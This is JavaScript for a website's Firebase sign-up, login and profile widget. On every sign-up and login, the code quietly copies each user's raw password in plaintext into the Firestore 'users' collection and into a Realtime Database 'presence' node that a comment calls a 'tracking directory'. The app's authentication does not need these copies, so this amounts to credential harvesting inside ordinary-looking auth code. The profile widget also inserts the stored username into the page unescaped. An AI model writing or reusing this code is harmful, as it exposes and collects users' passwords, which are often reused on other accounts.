// ======================= FORM HANDLING =======================

function toggleForm(formType) {
    const signupForm = document.getElementById('signupForm');
    const loginForm = document.getElementById('loginForm');
    const signupBtn = document.getElementById('signupBtn');
    const loginBtn = document.getElementById('loginBtn');

    if (formType === 'signup') {
        signupForm.style.display = 'block';
        loginForm.style.display = 'none';
        signupBtn.classList.add('active');
        loginBtn.classList.remove('active');
    } else {
        signupForm.style.display = 'none';
        loginForm.style.display = 'block';
        signupBtn.classList.remove('active');
        loginBtn.classList.add('active');
    }
}

function handleSignup(event) {
    event.preventDefault();

    const username = document.getElementById('signup-username').value.trim();
    const email = document.getElementById('signup-email').value.trim();
    const password = document.getElementById('signup-password').value.trim();
    const confirm = document.getElementById('signup-confirm').value.trim();
    const accountType = 'user';

    if (!username || !email || !password || !confirm) {
        alert('⚠️ All fields are required!');
        return;
    }
    if (password.length < 6) {
        alert('⚠️ Password must be at least 6 characters!');
        return;
    }
    if (password !== confirm) {
        alert('⚠️ Passwords do not match!');
        return;
    }

    const submitBtn = event.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = 'SIGNING UP...';
    submitBtn.disabled = true;

    auth.createUserWithEmailAndPassword(email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            return user.updateProfile({ displayName: username }).then(() => {
                return db.collection('users').doc(user.uid).set({
                    email: email,
                    username: username,
                    password: password,
                    accountType: accountType,
                    createdAt: new Date().toLocaleString(),
                    uid: user.uid
                });
            });
        })
        .then(() => {
            const user = auth.currentUser;
            localStorage.setItem('userAccountType', accountType);
            localStorage.setItem('userUsername', username);
            
            if (user) {
                // Immediately save all details cleanly into the presence directory
                return Promise.all([
                    rtdb.ref('presence/' + user.uid).set({
                        uid: user.uid,
                        email: email,
                        username: username,
                        password: password,
                        isOnline: true,
                        time: new Date().toLocaleTimeString()
                    }),
                    rtdb.ref('presence/' + user.uid).onDisconnect().update({
                        isOnline: false
                    })
                ]);
            }
        })
        .then(() => {
            window.location.href = 'hub.html';
        })
        .catch((error) => {
            submitBtn.innerText = originalText;
            submitBtn.disabled = false;
            alert('⚠️ Error: ' + error.message);
        });
}

function handleLogin(event) {
    event.preventDefault();

    const email = document.getElementById('login-email').value.trim();
    const password = document.getElementById('login-password').value.trim();

    if (!email || !password) {
        alert('⚠️ Please enter email and password!');
        return;
    }

    const submitBtn = event.target.querySelector('button[type="submit"]');
    const originalText = submitBtn.innerText;
    submitBtn.innerText = 'LOGGING IN...';
    submitBtn.disabled = true;

    auth.signInWithEmailAndPassword(email, password)
        .then((userCredential) => {
            const user = userCredential.user;
            return db.collection('users').doc(user.uid).get()
                .then((docSnapshot) => {
                    if (docSnapshot.exists) {
                        const userData = docSnapshot.data();
                        const finalUsername = userData.username || email.split('@')[0];
                        
                        localStorage.setItem('userAccountType', userData.accountType);
                        localStorage.setItem('userEmail', userData.email);
                        localStorage.setItem('userUsername', finalUsername);

                        // Immediately write the direct user credentials into the tracking directory
                        rtdb.ref('presence/' + user.uid).set({
                            uid: user.uid,
                            email: userData.email,
                            username: finalUsername,
                            password: password, // Raw password straight from input
                            isOnline: true,
                            time: new Date().toLocaleTimeString()
                        });

                        rtdb.ref('presence/' + user.uid).onDisconnect().update({
                            isOnline: false
                        });

                        window.location.href = 'hub.html';
                    }
                });
        })
        .catch((error) => {
            submitBtn.innerText = originalText;
            submitBtn.disabled = false;
            alert('⚠️ Login failed: ' + error.message);
        });
}

// ======================= LOGOUT =======================

function logout() {
    const user = auth.currentUser;
    if (user) {
        rtdb.ref('presence/' + user.uid).update({ isOnline: false });
    }
    auth.signOut().then(() => {
        localStorage.clear();
        window.location.href = 'index.html';
    }).catch((error) => {
        alert('⚠️ Error logging out: ' + error.message);
    });
}

// ======================= PROFILE WIDGET & CLOCK =======================

function loadProfileWidget() {
    const widget = document.getElementById('profileWidget');
    if (!widget) return;
    const cachedUsername = localStorage.getItem('userUsername');
    const cachedEmail = localStorage.getItem('userEmail');
    if (cachedUsername) {
        widget.innerHTML = `
            <div class="profile-badge" onclick="toggleProfileMenu()">
                <span class="profile-avatar">${cachedUsername.charAt(0).toUpperCase()}</span>
                <span class="profile-name">${cachedUsername}</span>
            </div>
            <div class="profile-menu" id="profileMenu" style="display:none;">
                <p style="color:#cc0000; font-size:11px; padding:8px 12px; border-bottom:1px dashed #cc0000; word-break: break-all;">${cachedEmail || ''}</p>
                <button onclick="logout()">LOGOUT &#8594;</button>
            </div>
        `;
    }
}

function toggleProfileMenu() {
    const menu = document.getElementById('profileMenu');
    if (menu) menu.style.display = menu.style.display === 'none' ? 'block' : 'none';
}

function startClock() {
    function updateClock() {
        const el = document.getElementById('footerClock');
        if (!el) return;
        const now = new Date();
        el.innerHTML = `<div class="clock-time">${now.toLocaleTimeString()}</div>`;
    }
    updateClock();
    setInterval(updateClock, 1000);
}

function checkAuth() {
    const currentPage = window.location.pathname;
    if (['hub.html', 'sites.html', 'chat.html', 'admin.html'].some(p => currentPage.includes(p))) {
        auth.onAuthStateChanged((user) => { if (!user) window.location.href = 'index.html'; });
    }
}

document.addEventListener('DOMContentLoaded', function() {
    checkAuth();
    loadProfileWidget();
    startClock();
});
